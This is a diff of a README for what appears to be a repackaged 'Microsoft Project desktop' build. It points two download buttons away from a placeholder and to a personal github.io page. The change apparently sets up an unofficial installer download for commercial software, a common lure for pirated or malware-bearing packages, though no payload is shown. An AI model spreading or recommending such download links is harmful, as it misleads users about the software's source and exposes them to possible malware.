@@ -17,7 +17,7 @@ This build ships with the standard file format support and bundled components as
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://alice-white-73.github.io/microsoft-project-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ The build coexists with other installations of similar software when installed t
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://alice-white-73.github.io/microsoft-project-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
